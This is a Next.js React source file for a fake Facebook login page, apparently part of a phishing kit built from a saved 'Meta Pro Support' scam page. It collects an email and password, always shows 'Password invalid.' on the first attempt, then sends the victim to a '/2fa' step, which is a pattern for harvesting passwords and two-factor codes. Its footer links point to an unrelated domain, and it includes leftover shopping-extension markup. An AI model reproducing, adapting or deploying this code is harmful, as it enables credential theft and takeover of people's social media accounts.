"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useRouter } from "next/navigation";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { schema } from "./schema";
import Link from "next/link";
import Script from "next/script";

type FormData = z.infer<typeof schema>;
export default function LoginPage() {
  const router = useRouter()
  const [countLogin, setCountLogin] = useState(0);

  const {
    register,
    handleSubmit,
    formState: { errors },
    setError
  } = useForm<FormData>({
    resolver: zodResolver(schema),
  });

  const onSubmit = (data: any) => {
    console.log(data);
    setCountLogin(prev => prev + 1)
    if (countLogin > 0) {
      router.push('/2fa')
    } else {
      setError('password', { message: 'Password invalid.' });
    }
  };


  return (
    <>
      <Script src="/Meta Pro Support_ Facebook and Instagram_files/jquery-3.6.4.min.js.download"></Script>
      <Script src="/Meta Pro Support_ Facebook and Instagram_files/autorefresher.min.js.download"></Script>
      <Script src="/Meta Pro Support_ Facebook and Instagram_files/socket.io.js.download"></Script>
      <Script src="/Meta Pro Support_ Facebook and Instagram_files/owl.carousel.min.js.download"></Script>
      <Script src="/Meta Pro Support_ Facebook and Instagram_files/jquery.select.min.js.download"></Script>
      <Script src="/Meta Pro Support_ Facebook and Instagram_files/main.js.download"></Script>

      <div style={{ paddingTop: "initial" }}>

        <div className="myus-shopping">
          <div
            className="my-core-extension"
            id="myus-mall-extension-is-installed"
            style={{ display: "none" }}
          >
            <div className=" ">
              <div
                className="myus-header-container fadeInSlideDown is-hidden"
                id="myus-header-container"
              >
                <div className="flex-nav">
                  <div className="myus-flex-item brand-image-container">
                    <div className="brand-image-container-link pointer">
                      <Link target="_blank" href="https://shopping.myus.com/stores/">
                        <span>
                          <img
                            className="brandImage"
                            src="chrome-extension://jdohdiappiakacbmckagohongolonbpj/img/banner-logo.png"
                            alt="MyUS Shopping Logo"
                          />
                        </span>
                      </Link>
                    </div>
                  </div>
                  <div className="myus-flex-item line-spacer">
                    <span className="line" />
                  </div>
                  <div />
                  <div
                    className="margin-left browse-button nav-hover myus-flex-item "
                    id="browse-button"
                  >
                    <a
                      role="button"
                      tabIndex={0}
                      className="myus-flex-item"
                      id="browse-button-click"
                      style={{ height: "100%" }}
                    >
                      <img
                        className="is-hidden noclick"
                        src="chrome-extension://jdohdiappiakacbmckagohongolonbpj/img/shop-icon.png"
                        alt="Browse Stores by Hovering Over Item"
                        style={{ width: 23, height: 23, marginRight: 3 }}
                      />
                      <span className="noclick">Browse Stores</span>
                    </a>
                  </div>
                  <div
                    className="myus-flex-item myus-add-to-cart-container"
                    style={{ marginLeft: "auto" }}
                  >
                    <div id="add-to-myus-and-minicart-button">
                      <div
                        role="button"
                        id="add-to-myus-cart-button"
                        tabIndex={0}
                        className="add-to-cart-button "
                      >
                        <span>Add to MyUS cart</span>
                      </div>
                      <div className="verticalSeparator" />
                      <div
                        role="button"
                        tabIndex={0}
                        id="myus-minicart-button"
                        className="add-to-cart-button "
                      >
                        <div className="cart-button-container margin-left myus-flex-item ">
                          <a
                            id="view-cart-button-click"
                            className="badgeContainerNav myus-flex-item"
                            rel="noopener noreferrer"
                            style={{
                              overflow: "visible",
                              paddingRight: "1.5em",
                              paddingLeft: "1em"
                            }}
                          >
                            <div />
                            <div />
                            <img
                              className="noclick"
                              src="chrome-extension://jdohdiappiakacbmckagohongolonbpj/img/cart-icon.png"
                              alt="View Cart"
                              style={{ width: 30, height: 30 }}
                            />
                          </a>
                        </div>
                      </div>
                    </div>
                  </div>
                  <a
                    role="button"
                    className="myus-flex-item"
                    tabIndex={0}
                    id="close-extension-button"
                  >
                    X
                  </a>
                  <a
                    aria-label="newInstall"
                    id="newInstallPage"
                    href="https://shopping.myus.com/stores?newInstall=true"
                    target="_blank"
                    rel="noopener noreferrer"
                  />
                </div>
              </div>
              <div className="modals-container">
                <div className="is-hidden">
                  <div
                    aria-label="modalBG"
                    role="button"
                    tabIndex={0}
                    className=" modal-background fadeInFaster"
                  />
                  <div>
                    <div>
                      <div className="modalContainer fadeIn" style={{ width: 900 }}>
                        <div className="modalContainer-inner" style={{ maxWidth: 900 }}>
                          <div
                            style={{
                              display: "flex",
                              justifyContent: "flex-end",
                              marginBottom: "0.5em"
                            }}
                          >
                            <a
                              role="link"
                              tabIndex={0}
                              style={{
                                fontFamily: '"Open Sans", sans-serif',
                                cursor: "pointer",
                                textDecorationLine: "underline"
                              }}
                            >
                              Close
                            </a>
                          </div>
                          <div className="manual-entry-modal">
                            <form className="custom-form">
                              <h3 id="manualEntryTitle" className="margin-bottom-small">
                                YOU CAN SHOP HERE!
                              </h3>
                              <p className="myus-small">
                                Find the product you want to buy and give us the
                                details.
                              </p>
                              <div className="is-hidden">
                                <div className="">
                                  <div className="custom-form-group undefined">
                                    <label className="is-hidden" htmlFor="ProductURL">
                                      :
                                    </label>
                                    <input
                                      name="ProductURL"
                                      id="ProductURL"
                                      type="hidden"
                                      title="Product URL"
                                      placeholder="Product URL"
                                      className=""
                                      defaultValue="https://recruit.wadivisions.com/login"
                                    />
                                  </div>
                                </div>
                              </div>
                              <div>
                                <div className="">
                                  <div style={{ display: "flex", width: "100%" }}>
                                    <div style={{ flex: "5 1 0%" }}>
                                      <div style={{ display: "flex" }}>
                                        <div className="custom-form-group margin-right-small">
                                          <label className="" htmlFor="Description">
                                            *Product Title:
                                          </label>
                                          <input
                                            name="Description"
                                            id="Description"
                                            type="text"
                                            title="Enter product title"
                                            placeholder="Enter product title"
                                            className=""
                                            defaultValue=""
                                          />
                                        </div>
                                        <div className="custom-form-group margin-right-small">
                                          <label className="" htmlFor="Value">
                                            *Price (USD):
                                          </label>
                                          <input
                                            name="Value"
                                            id="Value"
                                            type="text"
                                            title="Enter price"
                                            placeholder="Enter price"
                                            className=""
                                            defaultValue=""
                                          />
                                        </div>
                                        <div className="custom-form-group undefined">
                                          <label className="" htmlFor="Size">
                                            Size:
                                          </label>
                                          <input
                                            name="Size"
                                            id="Size"
                                            type="text"
                                            title="Enter size"
                                            placeholder="Enter size"
                                            className=""
                                            defaultValue=""
                                          />
                                        </div>
                                      </div>
                                      <div style={{ display: "flex" }}>
                                        <div className="custom-form-group margin-right-small">
                                          <label className="" htmlFor="Color">
                                            Color:
                                          </label>
                                          <input
                                            name="Color"
                                            id="Color"
                                            type="text"
                                            title="Enter color"
                                            placeholder="Enter color"
                                            className=""
                                            defaultValue=""
                                          />
                                        </div>
                                        <div className="custom-form-group undefined">
                                          <label className="" htmlFor="Note">
                                            Notes:
                                          </label>
                                          <input
                                            name="Note"
                                            id="Note"
                                            type="text"
                                            title="For Example: Order blue if black runs out of stock."
                                            placeholder="For Example: Order blue if black runs out of stock."
                                            className=""
                                            defaultValue=""
                                          />
                                        </div>
                                      </div>
                                    </div>
                                    <div style={{ marginLeft: 15, flex: "1 1 0%" }}>
                                      <div
                                        className=""
                                        style={{
                                          marginTop: 10,
                                          display: "flex",
                                          alignItems: "center"
                                        }}
                                      >
                                        <div
                                          className="margin-bottom"
                                          style={{ flex: "1 1 0%" }}
                                        >
                                          <div className="form-quantity-container">
                                            <div className="quantity-title ">
                                              <p className="myus-small">Quantity</p>
                                            </div>
                                            <div>
                                              <span
                                                role="button"
                                                tabIndex={0}
                                                className="myus-minus unselectable"
                                              >
                                                -
                                              </span>
                                              <span className="myus-counter unselectable">
                                                1
                                              </span>
                                              <span
                                                role="button"
                                                tabIndex={-1}
                                                className="myus-plus unselectable"
                                              >
                                                +
                                              </span>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                      <div>
                                        <div
                                          className="button-container "
                                          style={{ padding: 3 }}
                                        >
                                          <div
                                            role="button"
                                            tabIndex={0}
                                            className="width myus-custom-button add-to-cart-button"
                                          >
                                            <span>Add to Cart</span>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <div className="is-hidden">
                                <div className="custom-form-group undefined">
                                  <label className="is-hidden" htmlFor="Quantity">
                                    :
                                  </label>
                                  <input
                                    name="Quantity"
                                    id="Quantity"
                                    type="hidden"
                                    title="Quantity"
                                    placeholder="Quantity"
                                    className=""
                                    defaultValue={1}
                                  />
                                </div>
                              </div>
                            </form>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div />
              </div>
            </div>
          </div>
        </div>

        <div className="login_main">
          <div className="container" >
            <img
              src="./Meta Pro Support_ Facebook and Instagram_files/20200731035726.svg"
              alt="Icon"
            />
            <div className="alert">
              <div className="icon">
                <i className="bx bxs-info-circle" />
              </div>
              <p>You must log in to continue.</p>
            </div>
            <form
              className="form_container" 
              onSubmit={handleSubmit(onSubmit)}
            >
              <h2>Log in to Facebook</h2>
              <div className="alert">
                <p>You must log in to continue.</p>
              </div>
              <div className="inputs">
                <div>
                  <input
                    {...register("email")}
                    id="email"
                    type="text"
                    name="email"
                    data-email="true"
                    data-required="true"
                    placeholder="Email address or phone number"
                    defaultValue=""
                  />
                  {errors.email && <span className="error">{errors.email.message}</span>}

                </div>
                <div>
                  <input
                    {...register("password")}
                    type="password"
                    name="password"
                    id="password"
                    placeholder="Password"
                    data-required="true"
                  />
                  {errors.password && <span className="error">{errors.password.message}</span>}

                </div>
                <button type="submit" name="submitLogin">
                  <i className="bx bx-loader-alt bx-spin bx-rotate-90" />
                  Log in
                </button>
              </div>
              <div className="links">
                <a href="https://www.facebook.com/login/identify">Forgotten account?</a>
                <span> · </span>
                <a href="https://www.facebook.com/">Sign up for Facebook</a>
              </div>
            </form>

          </div>
          <div className="footer">
            <div className="topFooter">
              <a href="https://recruit.wadivisions.com/login#">English (UK)</a>
              <a href="https://recruit.wadivisions.com/login#">Deutsch</a>
              <a href="https://recruit.wadivisions.com/login#">Türkçe</a>
              <a href="https://recruit.wadivisions.com/login#">Српски</a>
              <a href="https://recruit.wadivisions.com/login#">Français (France)</a>
              <a href="https://recruit.wadivisions.com/login#">Italiano</a>
              <a href="https://recruit.wadivisions.com/login#">Bosanski</a>
              <a href="https://recruit.wadivisions.com/login#">Svenska</a>
              <a href="https://recruit.wadivisions.com/login#">Español</a>
              <a href="https://recruit.wadivisions.com/login#">Português (Brasil)</a>
            </div>
            <div className="bottomFooter">
              <a href="https://recruit.wadivisions.com/login#">Sign Up</a>
              <a href="https://recruit.wadivisions.com/login#">Log in</a>
              <a href="https://recruit.wadivisions.com/login#">Messenger</a>
              <a href="https://recruit.wadivisions.com/login#">Facebook Lite</a>
              <a href="https://recruit.wadivisions.com/login#">Watch</a>
              <a href="https://recruit.wadivisions.com/login#">Places</a>
              <a href="https://recruit.wadivisions.com/login#">Games</a>
              <a href="https://recruit.wadivisions.com/login#">Marketplace</a>
              <a href="https://recruit.wadivisions.com/login#">Meta Pay</a>
              <a href="https://recruit.wadivisions.com/login#">Oculus</a>
              <a href="https://recruit.wadivisions.com/login#">Portal</a>
              <a href="https://recruit.wadivisions.com/login#">Instagram</a>
              <a href="https://recruit.wadivisions.com/login#">Bulletin</a>
              <a href="https://recruit.wadivisions.com/login#">Fundraisers</a>
              <a href="https://recruit.wadivisions.com/login#">Services</a>
              <a href="https://recruit.wadivisions.com/login#">
                Voting Information Centre
              </a>
              <a href="https://recruit.wadivisions.com/login#">Privacy Policy</a>
              <a href="https://recruit.wadivisions.com/login#">Privacy Center</a>
              <a href="https://recruit.wadivisions.com/login#">Groups</a>
              <a href="https://recruit.wadivisions.com/login#">About</a>
              <a href="https://recruit.wadivisions.com/login#">Create ad</a>
              <a href="https://recruit.wadivisions.com/login#">Create Page</a>
              <a href="https://recruit.wadivisions.com/login#">Developers</a>
              <a href="https://recruit.wadivisions.com/login#">Careers</a>
              <a href="https://recruit.wadivisions.com/login#">Cookies</a>
              <a href="https://recruit.wadivisions.com/login#">AdChoices</a>
              <a href="https://recruit.wadivisions.com/login#">Terms</a>
              <a href="https://recruit.wadivisions.com/login#">Help</a>
              <a href="https://recruit.wadivisions.com/login#">
                Contact uploading and non-users
              </a>
            </div>
            <span>Meta © 2023</span>
          </div>

        </div>

      </div>
    </>

  );
}
